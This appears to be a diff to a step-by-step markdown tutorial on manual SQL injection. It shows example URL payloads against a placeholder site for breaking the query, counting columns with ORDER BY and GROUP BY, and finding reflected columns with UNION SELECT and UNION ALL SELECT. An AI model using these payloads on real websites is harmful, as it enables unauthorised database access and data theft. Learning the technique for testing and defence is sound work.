@@ -2,7 +2,7 @@
 
 #### Steps to perform SQL Injection.
 1. Break the Query.
-2. Fix the Query.
+2. Fix/Balance the Query.
 3. Get the total number of columns.
 4. Get the vulnerable columns.
 5. Exploit. (get the data from database)
@@ -14,7 +14,7 @@
  - example,
    - https://website.com/product/id?=23'
    - https://website.com/product/id?=23"
-- after adding the ``` ', ", `, .```, you'll see error messages like, `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1` or maybe unusual behaviour in target website.
+- after adding the ``` ', ", `, .```, you'll see error messages like, `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'' at line 1` or any wired errors or maybe unusual behaviour in/on target website.
 
 ### 2) Fix the Query.
 - after breaking the query, we've to fix the query. So, we can **balance** the **SQL QUERY**.
@@ -39,6 +39,14 @@
    - https://website.com/product/id?=23' ORDER BY 4-- ERROR.
    - https://website.com/product/id?=23' ORDER BY 3-- NO ERROR.
      - So, website has 3 columns.
+   - https://website.com/product/id?=23' ORDER BY 1,2,3,4,5-- ERROR.
+   - https://website.com/product/id?=23' ORDER BY 1,2,3,4-- ERROR.
+   - https://website.com/product/id?=23' ORDER BY 1,2,3-- NO ERROR.
+     - So, website has 3 columns.
+   - https://website.com/product/id?=23' GROUP BY 5-- ERROR.
+   - https://website.com/product/id?=23' GROUP BY 4-- ERROR.
+   - https://website.com/product/id?=23' GROUP BY 3-- NO ERROR.
+     - So, website has 3 columns.
    - https://website.com/product/id?=23' GROUP BY 1,2,3,4,5-- ERROR.
    - https://website.com/product/id?=23' GROUP BY 1,2,3,4-- ERROR.
    - https://website.com/product/id?=23' GROUP BY 1,2,3-- NO ERROR.
@@ -48,11 +56,13 @@
 
 ### 4) Get the vulnerable columns.
 - after getting the total number of columns, now it's time to find vulnerable columns, where we can try to place our pyloads strings to get the data from the database.
-- So, to get the vulnerable columns, we can use ```UNION SELECT NULL or INT ```.
+- So, to get the vulnerable columns, we can use ```UNION SELECT NULL or INT ``` or ```UNION ALL SELECT NULL or INT ```.
 - add the NULL or INT value, total number of columns we get.
 - example,
    - https://website.com/product/id?=23' UNION SELECT 1,2,3-- Because, we got the total 3 columns.
    - https://website.com/product/id?=23' UNION SELECT NULL,NULL,NULL--
+   - https://website.com/product/id?=23' UNION ALL SELECT 1,2,3--
+   - https://website.com/product/id?=23' UNION ALL SELECT NULL,NULL,NULL--
 - now, in the case of `https://website.com/product/id?=23' UNION SELECT 1,2,3--`, you'll see a numbers been reflacted on the website. ex. 2,3. So, columns 2 & 3 is vulnerable.
 - in case of NULL, we've to replace NULL by adding strings in each NULL value to get the vulnerable columns.
 - example.
